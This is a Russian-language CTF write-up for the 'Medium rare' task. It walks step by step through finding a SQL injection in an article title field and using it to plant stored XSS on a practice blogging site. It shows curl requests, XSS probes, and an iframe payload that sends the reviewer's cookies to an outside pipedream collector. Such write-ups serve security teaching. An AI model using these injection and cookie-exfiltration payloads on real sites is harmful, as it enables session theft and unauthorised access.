# Medium rare: Write-up

Заходим на сайт и видим, что сайт стал новым. Читаем единственный доступный пост и узнаём об изменениях в бекенде, конкурсе статей с критериями от итогового сочинения и подарке. Видимо, нужно как-то открыть зашифрованную часть этой статьи, чтобы забрать флаг.

Звучит подозрительно похоже на прошлогодний [Medium](https://github.com/teamteamdev/ugractf-2024-school/tree/production/tasks/medium), но есть нюансы. Проверим, так ли хорош новый бекенд, и как там залатали дыру с прошлого раза.

Попытаемся создать статью:

![](./writeup/new.png)

После создания статьи нам всё так же дают две ссылки и кладут куку с паролем для просмотра статьи:

![](./writeup/created.png)

Пароль верен только для конкретной статьи, механизм работы с куками такой же, как было в Medium, а без кук и пароля статья по прежнему не открывается:

![](./writeup/incognito.png)

Нужно всё так же стащить куку автора анонса, но теперь конкурсные работы нужно отправлять напрямую.

Анонс просит присылать только статьи, опубликованные на Poster. Но этот знак меня не остановит! *Можно ли отправить работу с другого сайта?*

![](./writeup/pipedream-send.png)

После отправки фейковой статьи, получаем обнадёживающий текст…

![](./writeup/submitted.png)

…который на самом деле является обманкой — кто-то ходит по нашей ссылке сразу, а не через много дней!

![](./writeup/pipedream-result.png)

И кук тут, конечно же, нет.

Может быть, взять [Yankbox](../yankbox)?

```shell
$ cat /tmp/exploit.html
<iframe src="https://mediumrare.q.2025.ugractf.ru/zrwvtcqhcjvjugnp/c3a2210ce5a3a970782e606e4b7b22f9/"
 onload="fetch(`https://eoyiklz399i8p9x.m.pipedream.net/?${this.contentDocument.cookie}`);">
$ curl -F file=@/tmp/exploit.html https://yankbox.q.2025.ugractf.ru/dxathg8v6c5d4qz3
https://yankbox.q.2025.ugractf.ru/dxathg8v6c5d4qz3/files/HTOtZy26jU.html
```

Не работает, браузер не даёт залезать внутрь поддомена.

![](./writeup/yankbox.png)

Значит, нужно искать уязвимость именно в Poster.

Посмотрим, что происходит при создании статьи:

![](./writeup/submit.png)

Многовато. Копируем как cURL-команду и очищаем от лишних заголовков:

```shell
$ curl 'https://mediumrare.q.2025.ugractf.ru/zrwvtcqhcjvjugnp/new/' \
    -X POST \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Origin: https://mediumrare.q.2025.ugractf.ru' \
    -H 'Referer: https://mediumrare.q.2025.ugractf.ru/zrwvtcqhcjvjugnp/new/' \
    --data-raw 'title=Title&free_content=%3Cdiv+class%3D%22ce-block%22+data-id%3D%22Uvd6PSioLg%22%3E%3Cdiv+class%3D%22ce-block__content%22%3E%3Cdiv+class%3D%22ce-paragraph+cdx-block%22+contenteditable%3D%22false%22+data-placeholder%3D%22%D0%9F%D0%B8%D1%88%D0%B8%D1%82%D0%B5+%D0%BF%D0%B8%D1%81%D1%8C%D0%BC%D0%B0...%22%3EContent%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E&paid_content=%3Cdiv+class%3D%22ce-block%22+data-id%3D%22QykmOK2ESo%22%3E%3Cdiv+class%3D%22ce-block__content%22%3E%3Cdiv+class%3D%22ce-paragraph+cdx-block%22+contenteditable%3D%22false%22+data-placeholder%3D%22%D0%9F%D0%B8%D1%88%D0%B8%D1%82%D0%B5+%D0%BF%D0%B8%D1%81%D1%8C%D0%BC%D0%B0...%22%3EPaid%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E'
```

В `--data-raw` URL-encoded содержимое. Пристальным взглядом на скриншот и на команду видим, что на сервер посылается сырой HTML в полях `free_content` и `paid_content`.

Вытаскиваем из результата ссылку простыми пайпами:

```shell
... | grep 'Версия для подписчиков' | cut -d'>' -f2 | cut -d'<' -f1
```

…и добавляем опцию `-s`, чтобы не мешало. Теперь попробуем отправить простую статью:

```shell
$ curl -s 'https://mediumrare.q.2025.ugractf.ru/zrwvtcqhcjvjugnp/new/' \
    -X POST \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Origin: https://mediumrare.q.2025.ugractf.ru' \
    -H 'Referer: https://mediumrare.q.2025.ugractf.ru/zrwvtcqhcjvjugnp/new/' \
    --data-raw 'title=Title&free_content=Free&paid_content=Paid' \
    | grep 'Версия для подписчиков' | cut -d'>' -f2 | cut -d'<' -f1
https://mediumrare.q.2025.ugractf.ru/zrwvtcqhcjvjugnp/6feba3bb9246221408fb4c2c54f5da35/?password=VdXg8-PB8s0yga4s63V71mAPMhxpDFov0BFiuAOGj4A=
```

Зайдём сначала без пароля, а потом с паролем:

![](./writeup/test-free.png)

![](./writeup/test-paid.png)

Отлично. Теперь попробуем засылать разные XSS-пейлоады во все поля сразу:

### `<script>alert(1);</script>`

urlencode: `%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E`

```shell
$ CONTENT='%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E'
$ curl -s 'https://mediumrare.q.2025.ugractf.ru/zrwvtcqhcjvjugnp/new/' \
    -X POST \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Origin: https://mediumrare.q.2025.ugractf.ru' \
    -H 'Referer: https://mediumrare.q.2025.ugractf.ru/zrwvtcqhcjvjugnp/new/' \
    --data-raw "title=$CONTENT&free_content=$CONTENT&paid_content=$CONTENT" \
    | grep 'Версия для подписчиков' | cut -d'>' -f2 | cut -d'<' -f1
https://mediumrare.q.2025.ugractf.ru/zrwvtcqhcjvjugnp/d79798e4c37cee9af44179b18405c17a/?password=umaZdTfraEvX9NYEV7fuc2lq1toKGfDhQX61PZpR6JE=
```

![](./writeup/alert.png)

Видимо, теги в содержании статьи очищаются на сервере, а в поле _Title_ подставляются экранированно.

### `<img src="x" onerror="alert(1);">`

urlencode: `%3Cimg%20src%3D%22x%22%20onerror%3D%22alert(1)%3B%22%3E`

```shell
$ CONTENT='%3Cimg%20src%3D%22x%22%20onerror%3D%22alert(1)%3B%22%3E'
$ curl -s 'https://mediumrare.q.2025.ugractf.ru/zrwvtcqhcjvjugnp/new/' \
    -X POST \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Origin: https://mediumrare.q.2025.ugractf.ru' \
    -H 'Referer: https://mediumrare.q.2025.ugractf.ru/zrwvtcqhcjvjugnp/new/' \
    --data-raw "title=$CONTENT&free_content=$CONTENT&paid_content=$CONTENT" \
    | grep 'Версия для подписчиков' | cut -d'>' -f2 | cut -d'<' -f1
```

![](./writeup/img-onerror.png)

Мда, то есть из содержимого тег просто выкинули, а в Title так и поставили.

### `<UnknownTag>`

Может быть на содержимое повесили какой-то санитайзер со списком разрешённых тегов?

urlencode: `%3CUnknownTag%3E`

```shell
$ CONTENT='%3CUnknownTag%3E'
$ curl -s 'https://mediumrare.q.2025.ugractf.ru/zrwvtcqhcjvjugnp/new/' \
    -X POST \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Origin: https://mediumrare.q.2025.ugractf.ru' \
    -H 'Referer: https://mediumrare.q.2025.ugractf.ru/zrwvtcqhcjvjugnp/new/' \
    --data-raw "title=$CONTENT&free_content=$CONTENT&paid_content=$CONTENT" \
    | grep 'Версия для подписчиков' | cut -d'>' -f2 | cut -d'<' -f1
```

![](./writeup/unknown-tag.png)

Видимо, так и есть. Посмотрим, насколько хорошо сделали экранирование в поле title.

Посмотрим, как его обрабатывает веб-редактор:

![](./writeup/editor-title.png)

Отлично, он просто подставляет его в форму как есть — можно выйти из терминала.

Title экранирует символы `<` и `>`, но будет ли он экранировать *кавычки*? Попробуем одинарную кавычку:

![](./writeup/single-apostrophe.png)

…и получаем немногословный ответ:

![](./writeup/sql-error.png)

В прошлой версии Poster использовалась sqlite для хранения базы данных — возможно, и в этой версии тоже он.

Кавычка закрывает текущее строковое поле (title), но мы не знаем, сколько ещё там полей. sqlite хорош тем, что типы там ни на что не влияют — можно спокойно ставить нули, и всё будет в некоторой мере работать.

Мы, скорее всего, находимся внутри INSERTа, который выглядит примерно так:

```sql
-- догадка на основе схемы из Medium
INSERT INTO
    article(token, id, title, field, other_field, another_field)
    VALUES (token, id, 'meow', 0, 0, 0)
--                      ^^^^ Текст подставляется сюда
```

То есть засылаемый нами текст должен выглядеть как-то так: `Title', field, other_field, another_field); --`, с точностью до количества полей, которое мы не знаем. Переберём:

0. `T'); --`: SQL Error
1. `T', 0); --`: SQL Error
2. `T', 0, 1); --`: Статья опубликована!

Получается, в таблице после `title` лежит ещё два каких-то поля. Посмотрим на наше чудо, и нас встречает в бесплатной версии 500, а в платной — Failed to decrypt paid content:

![](./writeup/internal-server-error.png)

![](./writeup/failed-to-decrypt.png)

<!-- Ну прям как в Matrix! -->

Возможно, какие-то из этих полей должны быть не числами, а строками. Попробуем послать `T', 'A', 'B'); --` чтобы определить, какое поле где:

![](./writeup/free.png)

Отлично, то есть `A` — это free content. А что с paid content, который должен был шифроваться в базе?

![](./writeup/paid.png)

`Failed to decrypt paid content`. То есть в базе `paid_content` действительно хранится в зашифрованном виде, а не обычным текстом. Ну и не надо, нам и бесплатной версии хватит, лишь бы преобразования над HTML происходили при `INSERT`, а не при `SELECT`.

Попробуем положить `T', '<script>alert(1);</script>', 'P'); --` и открыть бесплатную версию:

![](./writeup/alert-works.png)

Отлично, теперь мы можем положить что угодно в содержимое поста и послать на проверку. Засылаем:

```
T', '<iframe src="https://mediumrare.q.2025.ugractf.ru/zrwvtcqhcjvjugnp/c3a2210ce5a3a970782e606e4b7b22f9/" onload="fetch(`https://eoyiklz399i8p9x.m.pipedream.net/?${this.contentDocument.cookie}`);">', 'P'); --
```

![](./writeup/xss.png)

Вроде работает. Отправляем на проверку и смотрим в pipedream:

![](./writeup/password.png)

Пароль приехал. Верный ли он? Открываем страницу с анонсом и дописываем в URL:

```
?password=L8pb21boMp_BRKo1PifnMyFLrapzXSQW026G7yUnSCP=
```

…как в ссылках, которые отдаются при публикации. Проверяем:

![](./writeup/flag.png)

Флаг: **ugra_we_should_have_used_wordpress_kq9v3ntp191l**
